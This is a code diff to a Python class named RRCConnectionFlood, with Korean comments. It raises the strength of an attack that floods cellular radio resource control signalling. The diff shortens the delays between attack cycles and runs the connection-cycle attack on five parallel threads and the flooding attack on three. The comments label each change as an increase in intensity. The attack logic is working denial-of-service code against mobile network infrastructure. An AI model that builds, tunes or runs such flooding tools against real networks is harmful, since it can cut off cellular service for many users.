@@ -234,7 +234,7 @@ class RRCConnectionFlood:
                 self.send_message(rrc_release, f"RRC Connection Release Request #{cycle_count}")
                 
                 cycle_count += 1
-                time.sleep(0.2)  # 다음 사이클까지 대기
+                time.sleep(0.01)  # 다음 사이클까지 대기 (강도 증가)
                 
             except Exception as e:
                 print(f"RRC 연결 사이클 오류: {e}")
@@ -252,7 +252,7 @@ class RRCConnectionFlood:
                     self.send_message(rrc_request, f"Flooding UE {ue_id}")
                     time.sleep(0.001)  # 매우 짧은 간격
                 
-                time.sleep(0.1)  # 다음 라운드까지 대기
+                time.sleep(0.01)  # 다음 라운드까지 대기 (강도 증가)
                 
             except Exception as e:
                 print(f"플러딩 공격 오류: {e}")
@@ -287,18 +287,20 @@ class RRCConnectionFlood:
         self.running = True
         
         if attack_type == "cycle":
-            # RRC 연결 사이클 공격
-            thread = threading.Thread(target=self.rrc_connection_cycle, args=(1000, duration))
-            thread.daemon = True
-            thread.start()
-            self.attack_threads.append(thread)
+            # RRC 연결 사이클 공격 - 강도 증가
+            for i in range(5):  # 5개 스레드로 동시 공격
+                thread = threading.Thread(target=self.rrc_connection_cycle, args=(1000, duration))
+                thread.daemon = True
+                thread.start()
+                self.attack_threads.append(thread)
             
         elif attack_type == "flooding":
-            # 플러딩 공격
-            thread = threading.Thread(target=self.flooding_attack, args=(num_ues, duration))
-            thread.daemon = True
-            thread.start()
-            self.attack_threads.append(thread)
+            # 플러딩 공격 - 강도 증가
+            for i in range(3):  # 3개 스레드로 동시 플러딩
+                thread = threading.Thread(target=self.flooding_attack, args=(num_ues, duration))
+                thread.daemon = True
+                thread.start()
+                self.attack_threads.append(thread)
             
         elif attack_type == "mixed":
             # 혼합 공격
